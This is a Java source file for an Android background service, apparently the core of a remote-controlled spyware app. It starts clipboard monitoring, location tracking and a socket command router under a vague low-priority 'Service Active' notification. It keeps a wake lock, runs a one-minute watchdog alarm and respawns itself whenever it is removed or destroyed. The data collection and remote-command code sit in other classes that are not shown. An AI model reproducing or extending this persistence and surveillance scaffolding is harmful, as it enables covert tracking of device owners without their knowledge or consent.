package com.fason.app.service;

import android.app.AlarmManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;
import android.content.pm.ServiceInfo;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.fason.app.R;
import com.fason.app.core.network.SocketCommandRouter;
import com.fason.app.features.clipboard.ClipboardMonitor;
import com.fason.app.features.location.LocManager;
import com.fason.app.receiver.BootReceiver;
import com.fason.app.receiver.WatchdogReceiver;

public class MainService extends Service {

    private static final String CHANNEL = "MainService";
    private static final String PREFS = "fason_prefs";
    private static final int WATCHDOG_INTERVAL = 60000; // 1 min

    private static PowerManager.WakeLock wakeLock;
    private static MainService instance;
    private ClipboardMonitor clipMonitor;
    private LocManager locManager;
    private SharedPreferences prefs;
    private int currentForegroundType = 0;

    @Override
    public IBinder onBind(Intent intent) { return null; }

    public static MainService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        createChannel();
        startForegroundNotification(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        acquireWakeLock();
        WatchdogReceiver.setServiceActive(this, true);
        clipMonitor = ClipboardMonitor.getInstance(this);
        clipMonitor.start();
        locManager = new LocManager(this);
        SocketCommandRouter.initialize();
        scheduleWatchdog();
    }

    public void updateForegroundType(int newType) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Combine types for multiple features
            int combinedType = currentForegroundType | newType;
            if (combinedType != currentForegroundType) {
                currentForegroundType = combinedType;
                startForegroundNotification(combinedType);
            }
        }
    }

    public void releaseForegroundType(int type) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            int remainingType = currentForegroundType & ~type;
            if (remainingType != currentForegroundType && remainingType != 0) {
                currentForegroundType = remainingType;
                startForegroundNotification(remainingType);
            }
        }
    }

    private void startForegroundNotification(int serviceType) {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("Service Active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(1, builder.build(), serviceType);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(1, builder.build());
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "Service", NotificationManager.IMPORTANCE_LOW);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private void acquireWakeLock() {
        if (wakeLock == null) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "fason:MainService");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire(10 * 60 * 1000L); // 10 min timeout, renewed
            }
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
            wakeLock = null;
        }
    }

    private void scheduleWatchdog() {
        Intent i = new Intent(this, WatchdogReceiver.class);
        i.setAction("keepAlive");

        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) flags |= PendingIntent.FLAG_IMMUTABLE;

        PendingIntent pi = PendingIntent.getBroadcast(this, 999, i, flags);
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        if (am != null) {
            long trigger = SystemClock.elapsedRealtime() + WATCHDOG_INTERVAL;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // Android 12+ requires SCHEDULE_EXACT_ALARM permission for exact alarms
                if (am.canScheduleExactAlarms()) {
                    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                } else {
                    // Fall back to inexact alarm if permission not granted
                    am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Renew wakelock
        if (wakeLock != null && !wakeLock.isHeld()) {
            wakeLock.acquire(10 * 60 * 1000L);
        }
        // Schedule next watchdog
        scheduleWatchdog();
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        scheduleRestart();
    }

    @Override
    public void onDestroy() {
        if (clipMonitor != null) clipMonitor.stop();
        if (locManager != null) locManager.stopLocationUpdates();
        releaseWakeLock();
        WatchdogReceiver.setServiceActive(this, false);
        instance = null;
        scheduleRestart();
        super.onDestroy();
    }

    private void scheduleRestart() {
        try {
            Intent i = new Intent(this, BootReceiver.class);
            i.setAction("respawnService");

            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) flags |= PendingIntent.FLAG_IMMUTABLE;

            PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, flags);
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

            if (am != null) {
                long trigger = SystemClock.elapsedRealtime() + 2000;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    // Android 12+ requires SCHEDULE_EXACT_ALARM permission for exact alarms
                    if (am.canScheduleExactAlarms()) {
                        am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                    } else {
                        // Fall back to inexact alarm if permission not granted
                        am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                    }
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                } else {
                    am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                }
            }

            // Also try direct restart
            ContextCompat.startForegroundService(this, new Intent(this, MainService.class));
        } catch (Exception ignored) {}
    }

    public LocManager getLocManager() {
        return locManager;
    }
}
